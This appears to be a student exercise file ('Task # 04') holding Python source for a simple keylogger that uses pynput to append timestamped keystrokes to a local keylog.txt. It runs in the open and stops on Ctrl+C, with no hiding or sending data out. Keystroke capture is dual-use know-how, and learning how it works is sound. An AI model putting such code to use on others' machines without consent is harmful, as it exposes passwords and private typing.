'''
Task # 04
Simple Keylogger
Create a basic keylogger program that records and logs keystrokes. 
Focus on logging the keys pressed and saving them to a file. 
Note: Ethical considerations and permissions are crucial for 
projects involving keyloggers.
'''

from pynput import keyboard
import time

# Function to handle key presses
def on_key_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            log_file.write(f"{timestamp} - {key}\n")
    except Exception as e:
        print(f"Error: {e}")

# Main function to start the keylogger
def main():
    print("Press Ctrl+C to stop logging.")
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()  # Start the listener in a separate thread
    try:
        while True:
            time.sleep(0.1)  # Keep the main thread running
    except KeyboardInterrupt:
        print("\nLogging stopped.")
        listener.stop()  # Stop the listener
        listener.join()  # Wait for the listener thread to finish

if __name__ == "__main__":
    main()
